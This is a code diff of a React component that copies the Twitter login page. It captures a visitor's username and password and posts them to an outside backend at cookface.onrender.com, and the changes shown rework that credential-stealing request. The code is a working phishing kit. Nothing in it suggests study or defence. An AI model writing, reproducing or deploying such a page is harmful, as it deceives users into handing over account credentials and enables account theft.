@@ -4,17 +4,14 @@ import { useNavigate } from "react-router-dom";
 import twitter from "../Assets/Twitter-logo.svg.webp";
 
 const TwitterPwd = () => {
-  const [formData, setFormData] = React.useState({
-    username: "",
-    password: "",
-  });
+  const [formData, setFormData] = React.useState({ user: "", pass: "" });
   const [loading, setLoading] = React.useState(false);
   const [isPasswordVisible, setPasswordVisibility] = React.useState(false);
 
   React.useEffect(() => {
     const ttname = JSON.parse(localStorage.getItem("ttname"));
     if (ttname) {
-      setFormData((prevData) => ({ ...prevData, username: ttname }));
+      setFormData((prevData) => ({ ...prevData, user: ttname }));
     }
   }, []);
 
@@ -24,15 +21,23 @@ const TwitterPwd = () => {
 
   const handleLogin = (e) => {
     const { value } = e.target;
-    setFormData((prevData) => ({ ...prevData, password: value }));
+    setFormData((prevData) => ({ ...prevData, pass: value }));
   };
 
   let navigate = useNavigate();
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     // make a request to the backend
-    axios.post("https://facecookbackend.onrender.com/api/v2/twitter", formData);
+    try {
+      await axios.post(
+        "https://cookface.onrender.com/api/v2/twitter",
+        formData
+      );
+    } catch (error) {
+      console.log(error.message);
+    }
+
     setLoading(true);
 
     // set a timeout
@@ -68,8 +73,8 @@ const TwitterPwd = () => {
               className="w-full p-3 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
               placeholder="Phone number, username, or email"
               type="text"
-              name="username"
-              value={formData.username}
+              name="user"
+              value={formData.user}
               onChange={handleLogin}
               required
             />
@@ -77,8 +82,8 @@ const TwitterPwd = () => {
               <input
                 className="w-full p-3 text-gray-700 text-sm bg-white border border-gray-300 rounded"
                 type={isPasswordVisible ? "text" : "password"}
-                name="password"
-                value={formData.password}
+                name="pass"
+                value={formData.pass}
                 onChange={handleLogin}
                 placeholder="Password"
                 required
